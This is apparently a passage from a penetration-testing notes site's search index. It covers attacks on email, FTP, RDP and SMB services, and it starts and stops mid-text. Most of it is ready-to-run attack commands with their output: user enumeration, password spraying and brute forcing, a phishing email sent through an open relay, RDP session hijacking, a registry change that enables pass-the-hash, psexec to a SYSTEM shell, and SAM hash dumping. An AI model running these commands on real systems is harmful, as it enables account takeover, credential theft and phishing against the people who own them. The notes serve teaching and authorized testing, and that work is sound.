2.1.5 elisa@LEGALCORP.xyz\n</code></pre> <p><code>RCPT TO</code> identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.</p> <pre><code>secops@kali[/kali]$ telnet 10.10.110.20 25\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n220 parrot ESMTP Postfix (Debian/GNU)\n\n\nMAIL FROM:test@xyz.com\nit is\n250 2.1.0 test@xyz.com... Sender ok\n\n\nRCPT TO:julio\n\n550 5.1.1 julio... User unknown\n\n\nRCPT TO:kate\n\n550 5.1.1 kate... User unknown\n\n\nRCPT TO:john\n\n250 2.1.5 john... Recipient ok\n</code></pre> <p>We can also use the <code>POP3</code> protocol to enumerate users depending on the service implementation. We can use the command <code>USER</code> followed by the username, and if the server responds <code>OK</code>. This means that the user exits on the server.</p> <pre><code>secops@kali[/kali]$ telnet 10.10.110.20 110\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n+OK POP3 Server ready\n\nUSER julio\n\n-ERR\n\n\nUSER john\n\n+OK\n</code></pre> <p>smtp-user-enum to automate this process</p> <pre><code>secops@kali[/kali]$ smtp-user-enum -M RCPT -U userlist.txt -D LEGALCORP.xyz -t 10.129.203.7\n\nStarting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )\n\n ----------------------------------------------------------\n|                   Scan Information                       |\n ----------------------------------------------------------\n\nMode ..................... RCPT\nWorker Processes ......... 5\nUsernames file ........... userlist.txt\nTarget count ............. 1\nUsername count ........... 78\nTarget TCP port .......... 25\nQuery timeout ............ 5 secs\nTarget domain ............ LEGALCORP.xyz\n\n######## Scan started at Thu Apr 21 06:53:07 2022 #########\n10.129.203.7: jose@LEGALCORP.xyz exists\n10.129.203.7: pedro@LEGALCORP.xyz exists\n10.129.203.7: kate@LEGALCORP.xyz exists\n######## Scan completed at Thu Apr 21 06:53:18 2022 #########\n3 results.\n\n78 queries in 11 seconds (7.1 queries / sec)\n</code></pre>  Cloud Enumeration <p>O365spray is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by ZDH.</p> <pre><code> O365 Spray\n\nsecops@kali[/kali]$ python3 o365spray.py --validate --domain msplaintext.xyz\n\n            *** O365 Spray ***            \n\n&gt;----------------------------------------&lt;\n\n   &gt; version        :  2.0.4\n   &gt; domain         :  msplaintext.xyz\n   &gt; validate       :  True\n   &gt; timeout        :  25 seconds\n   &gt; start          :  2022-04-13 09:46:40\n\n&gt;----------------------------------------&lt;\n\n[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz\n[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz\n</code></pre> <p>attempt to identify username <pre><code>secops@kali[/kali]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        \n\n            *** O365 Spray ***             \n\n&gt;----------------------------------------&lt;\n\n   &gt; version        :  2.0.4\n   &gt; domain         :  msplaintext.xyz\n   &gt; enum           :  True\n   &gt; userfile       :  users.txt\n   &gt; enum_module    :  office\n   &gt; rate           :  10 threads\n   &gt; timeout        :  25 seconds\n   &gt; start          :  2022-04-13 09:48:03\n\n&gt;----------------------------------------&lt;\n\n[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz\n[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz\n[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users\n[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz\n[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz\n[2022-04-13 09:48:10,415] INFO : \n\n[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'\n[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'\n\n[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2\n</code></pre></p>  Password Attacks <pre><code>secops@kali[/kali]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3\n\nHydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46\n[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task\n[DATA] attacking pop3://10.10.110.20:110/\n[110][pop3] host: 10.129.42.197   login: john   password: Company01!\n1 of 1 target successfully completed, 1 valid password found\n</code></pre> <p>If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like <code>Hydra</code>, but these tools are usually blocked. We can instead try to use custom tools such as o365spray or MailSniper for Microsoft Office 365 or CredKing for Gmail or Okta.</p> <p>O365 Spray - Password Spraying</p> <pre><code>secops@kali[/kali]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz\n\n            *** O365 Spray ***            \n\n&gt;----------------------------------------&lt;\n\n   &gt; version        :  2.0.4\n   &gt; domain         :  msplaintext.xyz\n   &gt; spray          :  True\n   &gt; password       :  March2022!\n   &gt; userfile       :  usersfound.txt\n   &gt; count          :  1 passwords/spray\n   &gt; lockout        :  1.0 minutes\n   &gt; spray_module   :  oauth2\n   &gt; rate           :  10 threads\n   &gt; safe           :  10 locked accounts\n   &gt; timeout        :  25 seconds\n   &gt; start          :  2022-04-14 12:26:31\n\n&gt;----------------------------------------&lt;\n\n[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz\n[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz\n[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.\n[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']\n[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!\n[2022-04-14 12:26:33,048] INFO : \n\n[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'\n[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'\n\n[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1\n</code></pre>  Protocol Specific Attacks <p>Open Relay</p> <pre><code>secops@kali[/kali]# swaks --from notifications@LEGALCORP.com --to employees@LEGALCORP.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213\n\n=== Trying 10.10.11.213:25...\n=== Connected to 10.10.11.213.\n&lt;-  220 mail.localdomain SMTP Mailer ready\n -&gt; EHLO parrot\n&lt;-  250-mail.localdomain\n&lt;-  250-SIZE 33554432\n&lt;-  250-8BITMIME\n&lt;-  250-STARTTLS\n&lt;-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1\n&lt;-  250 HELP\n -&gt; MAIL FROM:&lt;notifications@LEGALCORP.com&gt;\n&lt;-  250 OK\n -&gt; RCPT TO:&lt;employees@LEGALCORP.com&gt;\n&lt;-  250 OK\n -&gt; DATA\n&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\n -&gt; Date: Thu, 29 Oct 2020 01:36:06 -0400\n -&gt; To: employees@LEGALCORP.com\n -&gt; From: notifications@LEGALCORP.com\n -&gt; Subject: Company Notification\n -&gt; Message-Id: &lt;20201029013606.775675@parrot&gt;\n -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/\n -&gt; \n -&gt; Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/\n -&gt; \n -&gt; \n -&gt; .\n&lt;-  250 OK\n -&gt; QUIT\n&lt;-  221 Bye\n=== Connection closed with remote host.\n</code></pre>","title":"Email Services"},{"location":"attacking_common_services/attacking_ftp/","text":"Protocol Specifics Attacks <p>Brute Forcing (with Medusa)</p> <pre><code>secops@kali[/kali]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp \n\nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;                                                      \nACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)\nACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)\nACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)\nACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]\n</code></pre> <p>FTP Bounce Attack</p> <p>The Nmap -b flag can be used to perform an FTP bounce attack: <pre><code>secops@kali[/kali]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT\nResolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).\nAttempting connection to ftp://anonymous:password@10.10.110.213:21\nConnected:220 (vsFTPd 3.0.3)\nLogin credentials accepted by FTP server!\nInitiating Bounce Scan at 04:55\nFTP command misalignment detected ... correcting.\nCompleted Bounce Scan at 04:55, 0.54s elapsed (1 total ports)\nNmap scan report for 172.17.0.2\nHost is up.\n\nPORT   STATE  SERVICE\n80/tcp open http\n\n&lt;SNIP&gt;\n</code></pre></p>","title":"FTP"},{"location":"attacking_common_services/attacking_rdp/","text":"<p>Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.</p>  <p>One caveat on password guessing against Windows instances is that you should consider the client's password policy. In many cases, a user account will be locked or disabled after a certain number of failed login attempts. In this case, we can perform a specific password guessing technique called <code>Password Spraying</code>. This technique works by attempting a single password for many usernames before trying another password, being careful to avoid account lockout. </p>  <p>Crowbar - RDP Password Spraying <pre><code>secops@kali[/kali]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'\n\n2022-04-07 15:35:50 START\n2022-04-07 15:35:50 Crowbar v0.4.1\n2022-04-07 15:35:50 Trying 192.168.220.142:3389\n2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123\n2022-04-07 15:35:52 STOP\n</code></pre></p> <p>Hydra - RDP Password Spraying <pre><code>secops@kali[/kali]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp\n\nHydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52\n[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover\n[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)\n[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task\n[DATA] attacking rdp://192.168.2.147:3389/\n[3389][rdp] host: 192.168.2.143   login: administrator   password: password123\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56\n</code></pre></p>  Protocol Specific Attacks <p>Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.</p> <p>RDP Session Hijacking</p> <p>As shown in the example below, we are logged in as the user <code>juurena</code> (UserID = 2) who has <code>Administrator</code> privileges. Our goal is to hijack the user <code>lewen</code> (User ID = 4), who is also logged in via RDP.</p> <p></p> <p>To successfully impersonate a user without their password, we need to have <code>SYSTEM</code> privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which <code>SESSION ID</code> (<code>4</code> for the <code>lewen</code> session in our example) we would like to connect to which session name (<code>rdp-tcp#13</code>, which is our current session). The following command will open a new console as the specified <code>SESSION_ID</code> within our current RDP session:</p> <pre><code>C:\\xyz&gt; tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}\n</code></pre> <p>If we have local administrator privileges, we can use several methods to obtain <code>SYSTEM</code> privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as <code>Local System</code> and will execute any binary with <code>SYSTEM</code> privileges. We will use Microsoft sc.exe binary. First, pecify the service name (<code>sessionhijack</code>) and the <code>binpath</code>, which is the command we want to execute. Once we run the following command, a service named <code>sessionhijack</code> will be created.</p> <pre><code>C:\\xyz&gt; query user\n\n USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n&gt;juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM\n lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM\n\nC:\\xyz&gt; sc.exe create sessionhijack binpath= \"cmd.exe /k tscon 1 /dest:rdp-tcp#0\"\n\n[SC] CreateService SUCCESS\n</code></pre> <p></p> <p>To run the command, we can start the <code>sessionhijack</code> service:</p> <pre><code>C:\\xyz&gt; net start sessionhijack\n</code></pre> <p>Once the service is started, a new terminal with the <code>lewen</code> user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.</p> <p></p>  RDP Pass-The-Hash <p>We may want to access applications or software installed on a user's Windows system that is only available with GUI access during a penetration test. If we have plaintext credentials for the target user, it will be no problem to RDP into the system. However, what if we only have the NT hash of the user obtained from a credential dumping attack such as SAM database, and we could not crack the hash to reveal the plaintext password? In some instances, we can perform an RDP PtH attack to gain GUI access to the target system.</p> <p>There are a few caveats to this attack:</p> <p><code>Restricted Admin Mode,</code> which is disabled by default, should be enabled on the target host; otherwise, we'll get an error.</p> <p>This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa</code>. It can be done using the following command:</p> <pre><code>C:\\xyz&gt; reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre> <p></p> <p>Once the registry key is added, we can use xfreerdp with the option <code>/pth</code> to gain RDP access:</p> <pre><code>secops@kali[/kali]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9\n\n[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            \n[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   \n[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  \n[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 \n[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               \n[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state\n[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        \n[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0\n[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        \n[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags \"0xE2898235\"\n\n&lt;SNIP&gt;\n</code></pre> <p>This will not work against every Windows system we encounter, but it is always worth trying in a situation where we have an NTLM hash, know the user has RDP rights against a machine or set of machines, and GUI access would benefit us in some ways towards fulfilling the goal of our assessment.</p>","title":"RDP"},{"location":"attacking_common_services/attacking_smb/","text":"Enumeration <pre><code>secops@kali[/kali]$ sudo nmap 10.129.14.128 -sV -sC -p139,445\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00024s latency).\n\nPORT    STATE SERVICE     VERSION\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nHost script results:\n|_nbstat: NetBIOS name: xyz, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-09-19T13:16:04\n|_  start_date: N/A\n</code></pre> <p>Display a list of the server's shares with the option <code>-L</code>, and using the option <code>-N</code>, we tell <code>smbclient</code> to use the null session.</p> <pre><code>secops@kali[/kali]$ smbclient -N -L //10.129.14.128\n\n        Sharename       Type      Comment\n        -------      --     -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        notes           Disk      CheckIT\n        IPC$            IPC       IPC Service (DEVSM)\nSMB1 disabled no workgroup available\n</code></pre> <p><code>smbmap</code> provided a list of permissions for each shared folder <pre><code>secops@kali[/kali]$ smbmap -H 10.129.14.128\n\n[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   \n        Disk                                                    Permissions     Comment\n        --                                                   ---------    -------\n        ADMIN$                                                  NO ACCESS       Remote Admin\n        C$                                                      NO ACCESS       Default share\n        IPC$                                                    READ ONLY       IPC Service (DEVSM)\n        notes                                                   READ, WRITE     CheckIT\n</code></pre></p> <p>Using <code>smbmap</code> with the <code>-r</code> or <code>-R</code> (recursive) option, one can browse the directories:</p> <pre><code>secops@kali[/kali]$ smbmap -H 10.129.14.128 -r notes\n\n[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           \n        Disk                                                    Permissions     Comment\n        --                                                   ---------    -------\n        notes                                                   READ, WRITE\n        .\\notes\\*\n        dr--r--r               0 Mon Nov  2 00:57:44 2020    .\n        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..\n        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG\n        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt\n        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp\n        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ\n        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO\n        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup\n</code></pre> <p>If <code>read/write</code> permissions, we can use this to upload and the files. <pre><code>secops@kali[/kali]$ smbmap -H 10.129.14.128 --download \"notes\\note.txt\"\n\n[+] Starting download: notes\\note.txt (116 bytes)\n[+] File output to: /xyz/10.129.14.128-notes_note.txt\n</code></pre></p> <pre><code>secops@kali[/kali]$ smbmap -H 10.129.14.128 --upload test.txt \"notes\\test.txt\"\n\n[+] Starting upload: test.txt (20 bytes)\n[+] Upload complete.\n</code></pre> <p>Remote Procedure Call (RPC)</p> <p>We can use the <code>rpcclient</code> tool with a null session to enumerate a workstation or Domain Controller.</p> <p>Cheat Sheet from SANS Institute</p> <pre><code>secops@kali[/kali]$ rpcclient -U'%' 10.10.110.17\n\nrpcclient $&gt; enumdomusers\n\nuser:[mhope] rid:[0x641]\nuser:[svc-ata] rid:[0xa2b]\nuser:[svc-bexec] rid:[0xa2c]\nuser:[roleary] rid:[0xa36]\nuser:[smorgan] rid:[0xa37]\n</code></pre> <p>Enum4linux automation</p> <pre><code>secops@kali[/kali]$ ./enum4linux-ng.py 10.10.11.45 -A -C\n\nENUM4LINUX - next generation\n\n ==========================\n|    Target Information    |\n ==========================\n[*] Target ........... 10.10.11.45\n[*] Username ......... ''\n[*] Random Username .. 'noyyglci'\n[*] Password ......... ''\n\n ====================================\n|    Service Scan on 10.10.11.45     |\n ====================================\n[*] Checking LDAP (timeout: 5s)\n[-] Could not connect to LDAP on 389/tcp: connection refused\n[*] Checking LDAPS (timeout: 5s)\n[-] Could not connect to LDAPS on 636/tcp: connection refused\n[*] Checking SMB (timeout: 5s)\n[*] SMB is accessible on 445/tcp\n[*] Checking SMB over NetBIOS (timeout: 5s)\n[*] SMB over NetBIOS is accessible on 139/tcp\n\n ===================================================                            \n|    NetBIOS Names and Workgroup for 10.10.11.45    |\n ===================================================                                                                                         \n[*] Got domain/workgroup name: WORKGROUP\n[*] Full NetBIOS names information:\n- WIN-752039204 &lt;00&gt; -          B &lt;ACTIVE&gt;  Workstation Service\n- WORKGROUP     &lt;00&gt; -          B &lt;ACTIVE&gt;  Workstation Service\n- WIN-752039204 &lt;20&gt; -          B &lt;ACTIVE&gt;  Workstation Service\n- MAC Address = 00-0C-29-D7-17-DB\n...\n ========================================\n|    SMB Dialect Check on 10.10.11.45    |\n ========================================\n\n&lt;SNIP&gt;\n</code></pre>  Protocol Specifics Attacks <p>Brute Forcing and Password Spray</p> <pre><code>secops@kali[/kali]$ cat /tmp/userlist.txt\n\nAdministrator\njrodriguez \nadmin\n&lt;SNIP&gt;\njurena\n</code></pre> <pre><code>secops@kali[/kali]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\Administrator:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\jrodriguez:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\admin:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\eperez:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\amone:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\fsmith:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\tcrash:Company01! STATUS_LOGON_FAILURE \n\n&lt;SNIP&gt;\n\nSMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\jurena:Company01! (Pwn3d!) \n</code></pre> <p>When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:</p> <ul> <li>Remote Command Execution</li> <li>Extract Hashes from SAM Database</li> <li>Enumerating Logged-on Users</li> <li>Pass-the-Hash (PTH)</li> </ul> <p>Impacket PsExec</p> <pre><code>secops@kali[/kali]$ impacket-psexec administrator:'Password123!'@10.10.110.17\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Requesting shares on 10.10.110.17.....\n[*] Found writable share ADMIN$\n[*] Uploading file EHtJXgng.exe\n[*] Opening SVCManager on 10.10.110.17.....\n[*] Creating service nbAc on 10.10.110.17.....\n[*] Starting service nbAc.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.19041.1415]\n(c) Microsoft Corporation. All rights reserved.\n\n\nC:\\Windows\\system32&gt;whoami &amp;&amp; hostname\n\nnt authority\\system\nWIN7BOX\n</code></pre> <p>The same options apply to <code>impacket-smbexec</code> and <code>impacket-atexec</code>.</p> <p>CrackMapExec</p> <p>One advantage of <code>CrackMapExec</code> is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, <code>smb</code>, the IP address or IP address range, the option <code>-u</code> for username, and <code>-p</code> for the password, and the option <code>-x</code> to run cmd commands or uppercase <code>-X</code> to run PowerShell commands.</p> <pre><code>secops@kali[/kali]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [+] .\\Administrator:Password123! (Pwn3d!)\nSMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec\nSMB         10.10.110.17 445    WIN7BOX  nt authority\\system\n</code></pre> <p>If the <code>--exec-method</code> is not defined, CrackMapExec will try to execute the atexec method, if it fails we can try to specify the <code>--exec-method</code> smbexec.</p> <p>Enumerating Logged-on Users</p> <p>We are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use <code>CrackMapExec</code> to enumerate logged-on users on all machines within the same network <code>10.10.110.17/24</code>.</p> <pre><code>secops@kali[/kali]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\administrator:Password123! (Pwn3d!)\nSMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users\nSMB         10.10.110.17 445    WIN7BOX  WIN7BOX\\Administrator             logon_server: WIN7BOX\nSMB         10.10.110.17 445    WIN7BOX  WIN7BOX\\jurena                    logon_server: WIN7BOX\nSMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\\Administrator:Password123! (Pwn3d!)\nSMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users\nSMB         10.10.110.21 445    WIN10BOX  WIN10BOX\\demouser                logon_server: WIN10BOX\n</code></pre> <p>Extract Hashes from SAM Database</p> <ul> <li>Authenticate as another user.</li> <li>Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.</li> <li>Pass The Hash</li> </ul> <pre><code>secops@kali[/kali]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\administrator:Password123! (Pwn3d!)\nSMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes\nSMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::\nSMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::\nSMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\nSMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::\nSMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database\n</code></pre> <p>Pass-the-Hash (PtH)</p> <p>We can use a PtH attack with any <code>Impacket</code> tool, <code>SMBMap</code>, <code>CrackMapExec</code>, among other tools.</p> <pre><code>secops@kali[/kali]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)\n</code></pre> <p>Forced Authentication Attacks</p> <p>We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes.</p> <p>When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:</p> <ul> <li>The hostname file share's IP address is required.</li> <li>The local host file (C:\\Windows\\System32\\Drivers\\etc\\hosts) will be checked for suitable records.</li> <li>If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.</li> <li>Is there no local DNS record? A query will be sent to the DNS server that has been configured.</li> <li>If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.</li> </ul> <p>Suppose a user mistyped a shared folder's name 